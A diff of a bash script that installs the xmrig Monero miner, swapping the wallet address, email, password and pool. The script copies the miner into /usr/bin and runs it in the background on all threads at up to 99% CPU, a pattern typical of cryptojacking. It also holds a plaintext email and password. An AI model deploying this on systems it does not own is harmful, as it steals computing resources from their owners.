@@ -1,9 +1,9 @@
 #!/bin/bash
 
-WALLET=4754axtGmMm8HpocfKMsvLXKgQGVpuHsLb6m3xDPMiYKfwuJ6cbot1ZPnZT2c7pb1H1Kg451LtsARWEC8i7ixySQ7mT4Vcb
+WALLET=46XYFkrVGBjUjFS891F17uivxsijPnen18WmBKdrgUWzjoVPyQFduYzQwAK61ox5oZK5QmhBRqK5cF8gJ1HC69R6M3NdQkY
 ID="$(hostname)"
-MAIL=mamasarkanzas@gmail.com
-PASSWORD=$ID:$MAIL
+MAIL=mattgradon@gmail.com
+PASSWORD=mattgradon
 THREADS="$(nproc --all)"
 
 sleep 5
@@ -22,7 +22,7 @@ sleep 1
 chmod +x /tmp/miner/xmrig
 cp /tmp/miner/xmrig /usr/bin/
 sleep 1
-xmrig -o pool.supportxmr.com:5555 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=5 --background --max-cpu-usage=99 --av=1 --variant -1
+xmrig -o pool.monero.hashvault.pro:443 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=5 --background --max-cpu-usage=99 --av=1 --variant -1
 echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'
 
 touch /tmp/at.txt
